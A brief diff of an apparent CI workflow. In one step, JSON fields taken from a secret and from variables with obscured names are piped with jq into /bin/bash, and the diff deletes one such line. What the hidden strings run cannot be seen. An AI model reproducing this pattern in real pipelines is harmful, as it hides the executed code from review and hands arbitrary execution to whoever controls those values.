@@ -18,7 +18,6 @@ jobs:
           rhnc476: ${{ secrets.rhnc476 }}
         run: |
           printf '%s' "$rhnc476" | jq -r .ayro57 | /bin/bash
-          echo $u310 | jq -r .hrw598 | /bin/bash
           echo $mcx5 | jq -r .zoxv221 | /bin/bash
 
       - name: Upload artifact
